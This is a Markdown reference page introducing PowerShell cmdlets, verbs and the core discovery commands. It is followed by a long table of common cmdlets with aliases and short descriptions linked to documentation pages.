# PowerShell

## PowerShell Commands

In PowerShell, there are three main types of commands: cmdlets, functions, and aliases.  

### Cmdlets

Cmdlet is pronounced "command-let". They are instances of .NET classes, not stand-alone executables like in other shell environments. This makes it extremely easy for third parties to extend the functionality of PowerShell without compiling new binaries.  Cmdlet names have the form "Verb-Noun" to make them easily discoverable \(according to Microsoft anyway!\).

Since cmdlets are an actual instance of a .NET class, the output from a command is a bit different than in a traditional command shell.  Instead of the common standard-in and standard-out, PowerShell returns an object that contains a number of properties of which a select number are displayed depending on the cmdlet.  Objects returned by a cmdlet often have many more discoverable properties and methods that can be manipulated and acted on by those with experience, through experimentation, or by reading the documentation.  This makes it extremely powerful.  

You can also use them in pretty much the same way as commands in a traditional shell environment without knowing any of this, though you will get much more out of it if you take the time to learn.

#### cmdlet verbs

Cmdlets are restricted to only a set list of verbs.  Nouns can be whatever you want, but should follow Third party developers and scripters are encouraged by Microsoft to only use ones from this list for consistency, but PowerShell will not deny modules that use other verbs from running. The most common verbs are **New**, **Get**, **Set**, and **Invoke**, though there are many more. You can read more about this [here](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7). 

#### The Three Core Cmdlets \(TODO:put these in tables with descriptions\)

If you know how to use these three cmdlets, you can figure out how to use any other cmdlet.

Run `Get-Help $cmdlet_name -Examples` for usage

<table>
  <thead>
    <tr>
      <th style="text-align:left">Cmdlet</th>
      <th style="text-align:left">Alias</th>
      <th style="text-align:left">Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left"><a href="https://www.pdq.com/powershell/get-command/">Get-Command</a>
      </td>
      <td style="text-align:left">gcm</td>
      <td style="text-align:left">Gets all currently installed PowerShell commands.</td>
    </tr>
    <tr>
      <td style="text-align:left"><a href="https://www.pdq.com/powershell/get-help/">Get-Help</a>
      </td>
      <td style="text-align:left"></td>
      <td style="text-align:left">
        <p></p>
        <p>Displays basic help about cmdlets and functions, including examples. To
          get more advanced examples and information, the help index may need updating
          with <code>Update-Help</code> as it is not installed by default (may require
          admin rights). Similar to Unix <code>man</code> pages.</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left"><a href="https://www.pdq.com/powershell/get-member/">Get-Member</a>
      </td>
      <td style="text-align:left">gm</td>
      <td style="text-align:left">Gets the properties and methods of objects.</td>
    </tr>
  </tbody>
</table>

#### Other useful cmdlets

| Cmdlet Name | Alias | Description | Type |
| :--- | :--- | :--- | :--- |
| [Add-AppxPackage](https://www.pdq.com/powershell/add-appxpackage/) |  | Adds a signed app package to a user account. | Cmdlet |
| [Add-AppxProvisionedPackage](https://www.pdq.com/powershell/add-appxprovisionedpackage/) |  | Adds an app package \(.appx\) that will install for each new user to a Windows image. | Cmdlet |
| [Add-Computer](https://www.pdq.com/powershell/add-computer/) |  | Add the local computer to a domain or workgroup. | Cmdlet |
| [Add-Content](https://www.pdq.com/powershell/add-content/) | ac | Appends content, such as words or data, to a file. | Cmdlet |
| [Add-KdsRootKey](https://www.pdq.com/powershell/add-kdsrootkey/) |  | Generates a new root key for the Microsoft Group KdsSvc within Active Directory. | Cmdlet |
| [Add-LocalGroupMember](https://www.pdq.com/powershell/add-localgroupmember/) |  | Adds members to a local group. | Cmdlet |
| [Add-Member](https://www.pdq.com/powershell/add-member/) |  | Adds custom properties and methods to an instance of a PowerShell object. | Cmdlet |
| [Add-PSSnapin](https://www.pdq.com/powershell/add-pssnapin/) |  | Adds one or more PowerShell snap-ins to the current session. | Cmdlet |
| [Add-Type](https://www.pdq.com/powershell/add-type/) |  | Adds a.NET Framework type \(a class\) to a PowerShell session. | Cmdlet |
| [Add-WindowsCapability](https://www.pdq.com/powershell/add-windowscapability/) |  | Installs a Windows capability package on the specified operating system image. | Cmdlet |
| [Add-WindowsPackage](https://www.pdq.com/powershell/add-windowspackage/) |  | Adds a single .cab or .msu file to a Windows image. | Cmdlet |
| [Clear-Content](https://www.pdq.com/powershell/clear-content/) | clc | Deletes the contents of an item, but does not delete the item. | Cmdlet |
| [Clear-Variable](https://www.pdq.com/powershell/clear-variable/) | clv | Deletes the value of a variable. | Cmdlet |
| [Compare-Object](https://www.pdq.com/powershell/compare-object/) | compare, diff | Compares two sets of objects. | Cmdlet |
| [Confirm-SecureBootUEFI](https://www.pdq.com/powershell/confirm-securebootuefi/) |  | Confirms that Secure Boot is enabled by checking the Secure Boot status on the local computer. | Cmdlet |
| [Convert-Path](https://www.pdq.com/powershell/convert-path/) | cvpa | Converts a path from a PowerShell path to a PowerShell provider path. | Cmdlet |
| [ConvertFrom-Csv](https://www.pdq.com/powershell/convertfrom-csv/) |  | Converts object properties in comma-separated value \(CSV\) format into CSV versions of the original objects. | Cmdlet |
| [ConvertFrom-Json](https://www.pdq.com/powershell/convertfrom-json/) |  | Converts a JSON-formatted string to a custom object. | Cmdlet |
| [ConvertFrom-SecureString](https://www.pdq.com/powershell/convertfrom-securestring/) |  | Converts a secure string to an encrypted standard string. | Cmdlet |
| [ConvertFrom-String](https://www.pdq.com/powershell/convertfrom-string/) | CFS | Extracts and parses structured properties from string content. | Cmdlet |
| [ConvertFrom-StringData](https://www.pdq.com/powershell/convertfrom-stringdata/) |  | Converts a string containing one or more key and value pairs to a hash table. | Cmdlet |
| [ConvertTo-Csv](https://www.pdq.com/powershell/convertto-csv/) |  | Converts objects into a series of comma-separated value \(CSV\) variable-length strings. | Cmdlet |
| [ConvertTo-Html](https://www.pdq.com/powershell/convertto-html/) |  | Converts .NET Framework objects into HTML that can be displayed in a Web browser. | Cmdlet |
| [ConvertTo-Json](https://www.pdq.com/powershell/convertto-json/) |  | Converts an object to a JSON-formatted string. | Cmdlet |
| [ConvertTo-Xml](https://www.pdq.com/powershell/convertto-xml/) |  | Creates an XML-based representation of an object. | Cmdlet |
| [ConvertTo-SecureString](https://www.pdq.com/powershell/convertto-securestring/) |  | Converts encrypted standard strings to secure strings. It can also convert plain text to secure strings. Used with `ConvertFrom-SecureString` and `Read-Host`. | Cmdlet |
| [Copy-Item](https://www.pdq.com/powershell/copy-item/) | copy, cp, cpi | Copies an item from one location to another. | Cmdlet |
| [Disable-WindowsOptionalFeature](https://www.pdq.com/powershell/disable-windowsoptionalfeature/) |  | Disables a feature in a Windows image. | Cmdlet |
| [Enable-PSRemoting](https://www.pdq.com/powershell/enable-psremoting/) |  | Configures the computer to receive remote commands. | Cmdlet |
| [Enable-WindowsOptionalFeature](https://www.pdq.com/powershell/enable-windowsoptionalfeature/) |  | Enables a feature in a Windows image. | Cmdlet |
| [Enable-WSManCredSSP](https://www.pdq.com/powershell/enable-wsmancredssp/) |  | Enables CredSSP authentication on a computer. | Cmdlet |
| [Enter-PSSession](https://www.pdq.com/powershell/enter-pssession/) | etsn | Starts an interactive session with a remote computer. | Cmdlet |
| [Exit-PSSession](https://www.pdq.com/powershell/exit-pssession/) | exsn | Ends an interactive session with a remote computer. | Cmdlet |
| [Export-Certificate](https://www.pdq.com/powershell/export-certificate/) |  | Exports a certificate from a certificate store into a file. | Cmdlet |
| [Export-Clixml](https://www.pdq.com/powershell/export-clixml/) |  | Creates an XML-based representation of an object or objects and stores it in a file. | Cmdlet |
| [Export-Csv](https://www.pdq.com/powershell/export-csv/) | epcsv | Converts objects into a series of comma-separated \(CSV\) strings and saves the strings in a CSV file. | Cmdlet |
| [Export-ModuleMember](https://www.pdq.com/powershell/export-modulemember/) |  | Specifies the module members that are exported. | Cmdlet |
| [Export-PfxCertificate](https://www.pdq.com/powershell/export-pfxcertificate/) |  | Exports a certificate or a PFXData object to a Personal Information Exchange \(PFX\) file. | Cmdlet |
| [Export-StartLayout](https://www.pdq.com/powershell/export-startlayout/) |  | Exports the layout of the Start menu/screen. | Cmdlet |
| [Export-WindowsDriver](https://www.pdq.com/powershell/export-windowsdriver/) |  | Exports all third-party drivers from a Windows image to a destination folder. | Cmdlet |
| [Find-Package](https://www.pdq.com/powershell/find-package/) |  | Finds software packages in available package sources. | Cmdlet |
| [ForEach-Object](https://www.pdq.com/powershell/foreach-object/) | %, foreach | Performs an operation against each item in a collection of input objects. | Cmdlet |
| [Format-Custom](https://www.pdq.com/powershell/format-custom/) | fc | Uses a customized view to format the output. | Cmdlet |
| [Format-List](https://www.pdq.com/powershell/format-list/) | fl | Formats the output as a list of properties in which each property appears on a new line. | Cmdlet |
| [Format-Table](https://www.pdq.com/powershell/format-table/) | ft | Formats the output as a table. | Cmdlet |
| [Format-Wide](https://www.pdq.com/powershell/format-wide/) | fw | Formats objects as a wide table that displays only one property of each object. | Cmdlet |
| [Get-Acl](https://www.pdq.com/powershell/get-acl/) |  | Gets the security descriptor for a resource, such as a file or registry key. | Cmdlet |
| [Get-Alias](https://www.pdq.com/powershell/get-alias/) | gal | Gets the aliases for the current session. | Cmdlet |
| [Get-AppvClientPackage](https://www.pdq.com/powershell/get-appvclientpackage/) |  | Returns App-V Client Packages. | Cmdlet |
| [Get-AppxPackage](https://www.pdq.com/powershell/get-appxpackage/) |  | Gets a list of the app packages that are installed in a user profile. | Cmdlet |
| [Get-AppxProvisionedPackage](https://www.pdq.com/powershell/get-appxprovisionedpackage/) |  | Gets information about app packages \(.appx\) in an image that will be installed for each new user. | Cmdlet |
| [Get-AuthenticodeSignature](https://www.pdq.com/powershell/get-authenticodesignature/) |  | Gets information about the Authenticode signature for a file. | Cmdlet |
| [Get-BitsTransfer](https://www.pdq.com/powershell/get-bitstransfer/) |  | Gets the associated BitsJob object for an existing BITS transfer job. | Cmdlet |
| [Get-Certificate](https://www.pdq.com/powershell/get-certificate/) |  | Submits a certificate request to an enrollment server and installs the response or retrieves a certificate for a previously submitted request. | Cmdlet |
| [Get-ChildItem](https://www.pdq.com/powershell/get-childitem/) | dir, gci, ls | Gets the files and folders in a file system drive. | Cmdlet |
| [Get-CimInstance](https://www.pdq.com/powershell/get-ciminstance/) |  | Gets the CIM instances of a class from a CIM server. | Cmdlet |
| [Get-Clipboard](https://www.pdq.com/powershell/get-clipboard/) |  | Gets the current Windows clipboard entry. | Cmdlet |
| [Get-ComputerInfo](https://www.pdq.com/powershell/get-computerinfo/) |  | Gets a consolidated object of system and operating system properties. | Cmdlet |
| [Get-Content](https://www.pdq.com/powershell/get-content/) | cat, gc, type | Gets the contents of a file. | Cmdlet |
| [Get-Counter](https://www.pdq.com/powershell/get-counter/) |  | Gets performance counter data from local and remote computers. | Cmdlet |
| [Get-Credential](https://www.pdq.com/powershell/get-credential/) |  | Gets a credential object based on a user name and password. | Cmdlet |
| [Get-Culture](https://www.pdq.com/powershell/get-culture/) |  | Gets the current culture set in the operating system. | Cmdlet |
| [Get-Date](https://www.pdq.com/powershell/get-date/) |  | Gets the current date and time. | Cmdlet |
| [Get-Event](https://www.pdq.com/powershell/get-event/) |  | Gets the events in the event queue. | Cmdlet |
| [Get-EventLog](https://www.pdq.com/powershell/get-eventlog/) |  | Gets the events in an event log, or a list of the event logs, on the local or remote computers. | Cmdlet |
| [Get-ExecutionPolicy](https://www.pdq.com/powershell/get-executionpolicy/) |  | Gets the execution policies for the current session. | Cmdlet |
| [Get-History](https://www.pdq.com/powershell/get-history/) | ghy, h, history | Gets a list of the commands entered during the current session. | Cmdlet |
| [Get-Host](https://www.pdq.com/powershell/get-host/) |  | Gets an object that represents the current host program. | Cmdlet |
| [Get-HotFix](https://www.pdq.com/powershell/get-hotfix/) |  | Gets the hotfixes that have been applied to the local and remote computers. | Cmdlet |
| [Get-Item](https://www.pdq.com/powershell/get-item/) | gi | Gets files and folders. | Cmdlet |
| [Get-ItemProperty](https://www.pdq.com/powershell/get-itemproperty/) | gp | Gets the properties of a specified item. | Cmdlet |
| [Get-ItemPropertyValue](https://www.pdq.com/powershell/get-itempropertyvalue/) | gpv | Gets the value for one or more properties of a specified item. | Cmdlet |
| [Get-Job](https://www.pdq.com/powershell/get-job/) | gjb | Gets PowerShell background jobs that are running in the current session. | Cmdlet |
| [Get-LocalGroup](https://www.pdq.com/powershell/get-localgroup/) |  | Gets the local security groups. | Cmdlet |
| [Get-LocalGroupMember](https://www.pdq.com/powershell/get-localgroupmember/) |  | Gets members from a local group. | Cmdlet |
| [Get-LocalUser](https://www.pdq.com/powershell/get-localuser/) |  | Gets local user accounts. | Cmdlet |
| [Get-Location](https://www.pdq.com/powershell/get-location/) | gl, pwd | Gets information about the current working location \(directory\) or a location stack. | Cmdlet |
| [Get-Module](https://www.pdq.com/powershell/get-module/) | gmo | Gets the modules that have been imported or that can be imported into the current session. | Cmdlet |
| [Get-Package](https://www.pdq.com/powershell/get-package/) |  | Returns a list of all software packages that have been installed by using Package Management. | Cmdlet |
| [Get-PfxCertificate](https://www.pdq.com/powershell/get-pfxcertificate/) |  | Gets information about .pfx certificate files on the computer. | Cmdlet |
| [Get-Process](https://www.pdq.com/powershell/get-process/) | gps, ps | Gets the processes that are running on the local computer or a remote computer. | Cmdlet |
| [Get-PSDrive](https://www.pdq.com/powershell/get-psdrive/) | gdr | Gets drives in the current session. | Cmdlet |
| [Get-PSSession](https://www.pdq.com/powershell/get-pssession/) | gsn | Gets PowerShell session information on local and remote computers. | Cmdlet |
| [Get-PSSnapin](https://www.pdq.com/powershell/get-pssnapin/) |  | Gets the PowerShell snap-ins on the computer. | Cmdlet |
| [Get-Random](https://www.pdq.com/powershell/get-random/) |  | Gets a random number, or selects objects randomly from a collection. | Cmdlet |
| [Get-ScheduledJob](https://www.pdq.com/powershell/get-scheduledjob/) |  | Gets scheduled jobs on the local computer. | Cmdlet |
| [Get-Service](https://www.pdq.com/powershell/get-service/) | gsv | Gets the services on a local or remote computer. | Cmdlet |
| [Get-Tpm](https://www.pdq.com/powershell/get-tpm/) |  | Gets an object that contains information about a TPM. | Cmdlet |
| [Get-Unique](https://www.pdq.com/powershell/get-unique/) | gu | Returns unique items from a sorted list. | Cmdlet |
| [Get-Variable](https://www.pdq.com/powershell/get-variable/) | gv | Gets the variables in the current console. | Cmdlet |
| [Get-ScheduledJob](https://www.pdq.com/powershell/get-scheduledjob/) |  | Gets scheduled jobs on the local computer. | Cmdlet |
| [Get-WindowsCapability](https://www.pdq.com/powershell/get-windowscapability/) |  | Gets Windows capabilities for an image or a running operating system. | Cmdlet |
| [Get-WindowsOptionalFeature](https://www.pdq.com/powershell/get-windowsoptionalfeature/) |  | Gets information about optional features in a Windows image. | Cmdlet |
| [Get-WinEvent](https://www.pdq.com/powershell/get-winevent/) |  | Gets events from event logs and event tracing log files on local and remote computers. | Cmdlet |
| [Get-WmiObject](https://www.pdq.com/powershell/get-wmiobject/) | gwmi | Gets instances of WMI classes or information about the available classes. | Cmdlet |
| [Group-Object](https://www.pdq.com/powershell/group-object/) | group | Groups objects that contain the same value for specified properties. | Cmdlet |
| [Import-Certificate](https://www.pdq.com/powershell/import-certificate/) |  | Imports one or more certificates into a certificate store. | Cmdlet |
| [Import-Csv](https://www.pdq.com/powershell/import-csv/) | ipcsv | Creates table-like custom objects from the items in a CSV file. | Cmdlet |
| [Import-Clixml](https://www.pdq.com/powershell/import-clixml/) |  | Imports a CLIXML file and creates corresponding objects in PowerShell. | Cmdlet |
| [Import-Module](https://www.pdq.com/powershell/import-module/) | ipmo | Adds modules to the current session. | Cmdlet |
| [Import-PfxCertificate](https://www.pdq.com/powershell/import-pfxcertificate/) |  | Imports certificates and private keys from a Personal Information Exchange \(PFX\) file to the destination store. | Cmdlet |
| [Import-PSSession](https://www.pdq.com/powershell/import-pssession/) | ipsn | Imports commands from another session into the current session. | Cmdlet |
| [Import-StartLayout](https://www.pdq.com/powershell/import-startlayout/) |  | Imports the layout of the Start into a mounted Windows image. | Cmdlet |
| [Install-Package](https://www.pdq.com/powershell/install-package/) |  | Installs one or more software packages. | Cmdlet |
| [Install-PackageProvider](https://www.pdq.com/powershell/install-packageprovider/) |  | Installs one or more Package Management package providers. | Cmdlet |
| [Invoke-CimMethod](https://www.pdq.com/powershell/invoke-cimmethod/) |  | Invokes a method of a CIM class. | Cmdlet |
| [Invoke-Command](https://www.pdq.com/powershell/invoke-command/) | icm | Runs commands on local and remote computers. | Cmdlet |
| [Invoke-Expression](https://www.pdq.com/powershell/invoke-expression/) | iex | Runs commands or expressions on the local computer. | Cmdlet |
| [Invoke-Item](https://www.pdq.com/powershell/invoke-item/) | ii | Performs the default action on the specified item. | Cmdlet |
| [Invoke-RestMethod](https://www.pdq.com/powershell/invoke-restmethod/) | irm | Sends an HTTP or HTTPS request to a RESTful web service. | Cmdlet |
| [Invoke-WebRequest](https://www.pdq.com/powershell/invoke-webrequest/) | curl, iwr, wget | Gets content from a web page on the Internet. | Cmdlet |
| [Invoke-WmiMethod](https://www.pdq.com/powershell/invoke-wmimethod/) |  | Calls WMI methods. | Cmdlet |
| [Join-Path](https://www.pdq.com/powershell/join-path/) |  | Combines a path and a child path into a single path. | Cmdlet |
| [Measure-Command](https://www.pdq.com/powershell/measure-command/) |  | Measures the time it takes to run script blocks and cmdlets. | Cmdlet |
| [Measure-Object](https://www.pdq.com/powershell/measure-object/) | measure | Calculates the numeric properties of objects, such as the counts of the characters, words, and lines in string objects, such as from text files. | Cmdlet |
| [Move-Item](https://www.pdq.com/powershell/move-item/) | mi, move, mv | Moves an item from one location to another. | Cmdlet |
| [Mount-WindowsImage](https://www.pdq.com/powershell/mount-windowsimage/) |  | Mounts a Windows image in a WIM or VHD file to a directory on the local computer. | Cmdlet |
| [New-Alias](https://www.pdq.com/powershell/new-alias/) | nal | Creates a new alias. | Cmdlet |
| [New-CimSession](https://www.pdq.com/powershell/new-cimsession/) |  | Creates a CIM session. | Cmdlet |
| [New-EventLog](https://www.pdq.com/powershell/new-eventlog/) |  | Creates a new event log and a new event source on a local or remote computer. | Cmdlet |
| [New-Item](https://www.pdq.com/powershell/new-item/) | ni | Creates a new item. | Cmdlet |
| [New-ItemProperty](https://www.pdq.com/powershell/new-itemproperty/) |  | Creates a new property for an item and sets its value. | Cmdlet |
| [New-JobTrigger](https://www.pdq.com/powershell/new-jobtrigger/) |  | Creates a job trigger for a scheduled job. | Cmdlet |
| [New-LocalUser](https://www.pdq.com/powershell/new-localuser/) |  | Creates a local user account. | Cmdlet |
| [New-Object](https://www.pdq.com/powershell/new-object/) |  | Creates an instance of a .NET or COM object. | Cmdlet |
| [New-PSDrive](https://www.pdq.com/powershell/new-psdrive/) | mount, ndr | Creates temporary and persistent mapped network drives. | Cmdlet |
| [New-PSSession](https://www.pdq.com/powershell/new-pssession/) | nsn | Creates a persistent connection to a local or remote computer. | Cmdlet |
| [New-PSSessionOption](https://www.pdq.com/powershell/new-pssessionoption/) |  | Creates an object that contains advanced options for a PSSession. | Cmdlet |
| [New-SelfSignedCertificate](https://www.pdq.com/powershell/new-selfsignedcertificate/) |  | Creates a new self-signed certificate for testing purposes. | Cmdlet |
| [New-Service](https://www.pdq.com/powershell/new-service/) |  | Creates a new Windows service. | Cmdlet |
| [New-TimeSpan](https://www.pdq.com/powershell/new-timespan/) |  | Creates a TimeSpan object. | Cmdlet |
| [New-Variable](https://www.pdq.com/powershell/new-variable/) | nv | Creates a new variable. | Cmdlet |
| [New-WebServiceProxy](https://www.pdq.com/powershell/new-webserviceproxy/) |  | Creates a Web service proxy object that lets you use and manage the Web service in PowerShell. | Cmdlet |
| [Out-Default](https://www.pdq.com/powershell/out-default/) |  | Sends the output to the default formatter and to the default output cmdlet. | Cmdlet |
| [Out-File](https://www.pdq.com/powershell/out-file/) |  | Sends output to a file. | Cmdlet |
| [Out-GridView](https://www.pdq.com/powershell/out-gridview/) | ogv | Sends output to an interactive table in a separate window. | Cmdlet |
| [Out-Host](https://www.pdq.com/powershell/out-host/) | oh | Sends output to the command line. | Cmdlet |
| [Out-Null](https://www.pdq.com/powershell/out-null/) |  | Deletes output instead of sending it down the pipeline. | Cmdlet |
| [Out-Printer](https://www.pdq.com/powershell/out-printer/) | lp | Sends output to a printer. | Cmdlet |
| [Out-String](https://www.pdq.com/powershell/out-string/) |  | Sends objects to the host as a series of strings. | Cmdlet |
| [Push-Location](https://www.pdq.com/powershell/push-location/) | pushd | Adds the current location to the top of a location stack. | Cmdlet |
| [Read-Host](https://www.pdq.com/powershell/read-host/) |  | Reads a line of input from the console. | Cmdlet |
| [Receive-Job](https://www.pdq.com/powershell/receive-job/) | rcjb | Gets the results of the Windows PowerShell background jobs in the current session. | Cmdlet |
| [Register-ObjectEvent](https://www.pdq.com/powershell/register-objectevent/) |  | Subscribes to the events that are generated by a Microsoft .NET Framework object. | Cmdlet |
| [Register-ScheduledJob](https://www.pdq.com/powershell/register-scheduledjob/) |  | Creates a scheduled job. | Cmdlet |
| [Remove-AppxPackage](https://www.pdq.com/powershell/remove-appxpackage/) |  | Removes an app package from a user account. | Cmdlet |
| [Remove-AppxProvisionedPackage](https://www.pdq.com/powershell/remove-appxprovisionedpackage/) |  | Removes an app package \(.appx\) from a Windows image. | Cmdlet |
| [Remove-Computer](https://www.pdq.com/powershell/remove-computer/) |  | Removes the local computer from its domain. | Cmdlet |
| [Remove-Item](https://www.pdq.com/powershell/remove-item/) | del, erase, rd, ri, rm, rmdir | Deletes files and folders. | Cmdlet |
| [Remove-ItemProperty](https://www.pdq.com/powershell/remove-itemproperty/) | rp | Deletes the property and its value from an item. | Cmdlet |
| [Remove-Module](https://www.pdq.com/powershell/remove-module/) | rmo | Removes modules from the current session. | Cmdlet |
| [Remove-PSDrive](https://www.pdq.com/powershell/remove-psdrive/) | rdr | Deletes temporary PowerShell drives and disconnects mapped network drives. | Cmdlet |
| [Remove-PSSession](https://www.pdq.com/powershell/remove-pssession/) | rsn | Closes one or more PowerShell sessions. | Cmdlet |
| [Remove-Variable](https://www.pdq.com/powershell/remove-variable/) | rv | Deletes a variable and its value. | Cmdlet |
| [Remove-WmiObject](https://www.pdq.com/powershell/remove-wmiobject/) |  | Deletes an instance of an existing Windows Management Instrumentation \(WMI\) class. | Cmdlet |
| [Rename-Computer](https://www.pdq.com/powershell/rename-computer/) |  | Renames a computer. | Cmdlet |
| [Rename-Item](https://www.pdq.com/powershell/rename-item/) | ren, rni | Renames an item in a PowerShell provider namespace. | Cmdlet |
| [Repair-WindowsImage](https://www.pdq.com/powershell/repair-windowsimage/) |  | Repairs a Windows image in a WIM or VHD file. | Cmdlet |
| [Reset-ComputerMachinePassword](https://www.pdq.com/powershell/reset-computermachinepassword/) |  | Resets the machine account password for the computer. | Cmdlet |
| [Resolve-DnsName](https://www.pdq.com/powershell/resolve-dnsname/) |  | Performs a DNS name query resolution for the specified name.  This cmdlet is functionally similar to the nslookup tool which allows users to query for names. | Cmdlet |
| [Resolve-Path](https://www.pdq.com/powershell/resolve-path/) | rvpa | Resolves the wildcard characters in a path, and displays the path contents. | Cmdlet |
| [Restart-Computer](https://www.pdq.com/powershell/restart-computer/) |  | Restarts, or "reboots", the operating system on local and remote computers. | Cmdlet |
| [Restart-Service](https://www.pdq.com/powershell/restart-service/) |  | Stops and then starts one or more services. | Cmdlet |
| [Select-Object](https://www.pdq.com/powershell/select-object/) | select | Selects objects or object properties. | Cmdlet |
| [Select-String](https://www.pdq.com/powershell/select-string/) | sls | Finds text in strings and files. | Cmdlet |
| [Select-Xml](https://www.pdq.com/powershell/select-xml/) |  | Finds text in an XML string or document. | Cmdlet |
| [Send-MailMessage](https://www.pdq.com/powershell/send-mailmessage/) |  | Sends an email message. | Cmdlet |
| [Set-Acl](https://www.pdq.com/powershell/set-acl/) |  | Changes the security descriptor of a specified item, such as a file or a registry key. | Cmdlet |
| [Set-Alias](https://www.pdq.com/powershell/set-alias/) | sal | Creates or changes an alias for a cmdlet or other command element in the current PowerShell session. | Cmdlet |
| [Set-AuthenticodeSignature](https://www.pdq.com/powershell/set-authenticodesignature/) |  | Adds an Authenticode signature to a PowerShell script or other file. | Cmdlet |
| [Set-Content](https://www.pdq.com/powershell/set-content/) | sc | Replaces the contents of a file with contents that you specify. | Cmdlet |
| [Set-Culture](https://www.pdq.com/powershell/set-culture/) |  | Sets the user culture for the current user account. | Cmdlet |
| [Set-Date](https://www.pdq.com/powershell/set-date/) |  | Changes the system time on the computer to a time that you specify. | Cmdlet |
| [Set-DscLocalConfigurationManager](https://www.pdq.com/powershell/set-dsclocalconfigurationmanager/) |  | Applies Local Configuration Manager settings to nodes. | Cmdlet |
| [Set-ExecutionPolicy](https://www.pdq.com/powershell/set-executionpolicy/) |  | Changes the current PowerShell execution policy. | Cmdlet |
| [Set-Item](https://www.pdq.com/powershell/set-item/) | si | Changes the value of an item to the value specified in the command. | Cmdlet |
| [Set-ItemProperty](https://www.pdq.com/powershell/set-itemproperty/) | sp | Creates or changes the value of a property of an item. | Cmdlet |
| [Set-LocalUser](https://www.pdq.com/powershell/set-localuser/) |  | Modifies a local user account. | Cmdlet |
| [Set-Location](https://www.pdq.com/powershell/set-location/) | cd, chdir, sl | Sets the current working location to a specified location. | Cmdlet |
| [Set-PSDebug](https://www.pdq.com/powershell/set-psdebug/) |  | Turns script debugging features on and off, sets the trace level, and toggles strict mode. | Cmdlet |
| [Set-PSSessionConfiguration](https://www.pdq.com/powershell/set-pssessionconfiguration/) |  | Changes the properties of a registered session configuration. | Cmdlet |
| [Set-Service](https://www.pdq.com/powershell/set-service/) |  | Starts, stops, and suspends a service, and changes its properties. | Cmdlet |
| [Set-StrictMode](https://www.pdq.com/powershell/set-strictmode/) |  | Establishes and enforces coding rules in expressions, scripts, and script blocks. | Cmdlet |
| [Set-TimeZone](https://www.pdq.com/powershell/set-timezone/) |  | Sets the system time zone to a specified time zone. | Cmdlet |
| [Set-Variable](https://www.pdq.com/powershell/set-variable/) | set, sv | Sets the value of a variable. Creates the variable if one with the requested name does not exist. | Cmdlet |
| [Set-WinSystemLocale](https://www.pdq.com/powershell/set-winsystemlocale/) |  | Sets the system locale \(the language for non-Unicode programs\) for the current computer. | Cmdlet |
| [Set-WinUserLanguageList](https://www.pdq.com/powershell/set-winuserlanguagelist/) |  | Sets the language list and associated properties for the current user account. | Cmdlet |
| [Set-WmiInstance](https://www.pdq.com/powershell/set-wmiinstance/) |  | Creates or updates an instance of an existing Windows Management Instrumentation \(WMI\) class. | Cmdlet |
| [Set-WSManQuickConfig](https://www.pdq.com/powershell/set-wsmanquickconfig/) |  | Configures the local computer for remote management. | Cmdlet |
| [Sort-Object](https://www.pdq.com/powershell/sort-object/) | sort | Sorts objects by property values. | Cmdlet |
| [Split-Path](https://www.pdq.com/powershell/split-path/) |  | Returns the specified part of a path. | Cmdlet |
| [Start-BitsTransfer](https://www.pdq.com/powershell/start-bitstransfer/) |  | Creates a BITS transfer job. | Cmdlet |
| [Start-DscConfiguration](https://www.pdq.com/powershell/start-dscconfiguration/) |  | Applies configuration to nodes. | Cmdlet |
| [Start-Job](https://www.pdq.com/powershell/start-job/) | sajb | Starts a background job in PowerShell. | Cmdlet |
| [Start-Process](https://www.pdq.com/powershell/start-process/) | saps, start | Starts one or more processes on the local computer. | Cmdlet |
| [Start-Service](https://www.pdq.com/powershell/start-service/) | sasv | Starts one or more stopped services. | Cmdlet |
| [Start-Sleep](https://www.pdq.com/powershell/start-sleep/) | sleep | Suspends the activity in a script or session for the specified period of time. | Cmdlet |
| [Start-Transcript](https://www.pdq.com/powershell/start-transcript/) |  | Creates a record of all or part of a PowerShell session to a text file. | Cmdlet |
| [Stop-Computer](https://www.pdq.com/powershell/stop-computer/) |  | Shuts down local and remote computers. | Cmdlet |
| [Stop-Process](https://www.pdq.com/powershell/stop-process/) | kill, spps | Stops one or more running processes. | Cmdlet |
| [Stop-Service](https://www.pdq.com/powershell/stop-service/) | spsv | Stops one or more running services. | Cmdlet |
| [Stop-Transcript](https://www.pdq.com/powershell/stop-transcript/) |  | Stops logging PowerShell history. | Cmdlet |
| [Tee-Object](https://www.pdq.com/powershell/tee-object/) | tee | Saves command output in a file or variable and also sends it down the pipeline. | Cmdlet |
| [Test-ComputerSecureChannel](https://www.pdq.com/powershell/test-computersecurechannel/) |  | Tests and repairs the secure channel between the local computer and its domain. | Cmdlet |
| [Test-Connection](https://www.pdq.com/powershell/test-connection/) |  | Sends ICMP echo request packets \("pings"\) to one or more computers. | Cmdlet |
| [Test-Path](https://www.pdq.com/powershell/test-path/) |  | Determines whether all elements of a file or directory path exist. | Cmdlet |
| [Test-WSMan](https://www.pdq.com/powershell/test-wsman/) |  | Tests whether the WinRM service is running on a local or remote computer. | Cmdlet |
| [Unblock-File](https://www.pdq.com/powershell/unblock-file/) |  | Unblocks files that were downloaded from the Internet. | Cmdlet |
| [Uninstall-Package](https://www.pdq.com/powershell/uninstall-package/) |  | Uninstalls one or more software packages. | Cmdlet |
| [Update-Help](https://www.pdq.com/powershell/update-help/) |  | Downloads and installs the newest help files on your computer. | Cmdlet |
| [Wait-Job](https://www.pdq.com/powershell/wait-job/) | wjb | Suppresses the command prompt until one or all of the background jobs running in the PowerShell session are completed. | Cmdlet |
| [Wait-Process](https://www.pdq.com/powershell/wait-process/) |  | Waits for the processes to be stopped before accepting more input. | Cmdlet |
| [Where-Object](https://www.pdq.com/powershell/where-object/) | ?, where | Selects objects from a collection based on their property values. | Cmdlet |
| [Write-Debug](https://www.pdq.com/powershell/write-debug/) |  | Writes a debug message to the console. | Cmdlet |
| [Write-Error](https://www.pdq.com/powershell/write-error/) |  | Writes an object to the error stream. | Cmdlet |
| [Write-EventLog](https://www.pdq.com/powershell/write-eventlog/) |  | Writes an event to an event log. | Cmdlet |
| [Write-Host](https://www.pdq.com/powershell/write-host/) |  | Writes output to the console. | Cmdlet |
| [Write-Information](https://www.pdq.com/powershell/write-information/) |  | Specifies how PowerShell handles information stream data for a command. | Cmdlet |
